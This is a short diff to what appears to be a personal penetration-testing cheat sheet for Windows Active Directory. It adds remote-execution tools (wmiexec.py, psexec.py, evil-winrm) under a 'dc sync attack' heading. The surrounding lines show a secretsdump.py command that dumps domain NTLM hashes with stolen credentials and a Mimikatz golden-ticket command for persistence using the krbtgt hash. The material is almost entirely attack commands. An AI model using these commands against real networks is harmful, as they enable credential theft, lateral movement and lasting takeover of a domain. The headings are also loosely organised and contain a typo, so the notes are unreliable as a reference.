@@ -444,8 +444,11 @@ Always run winPEAS:
 
 
                            secretdump.py spooky.local/user:password@10.10.10.10  -just-dc-ntlm
-                           dc sync attack:
                            
+                           dc sync attack:
+                           wmiexec.py spooky.local/user:password@10.10.10.10 
+                           psexec.py
+                           evilwinrm
                            
                            persistence:
                            kerberos::golden /domian:spooky.local /sid:xxxxxxxxxxxxxxxxxxx  /user:admin /krbtgt:nt-hash /ptt
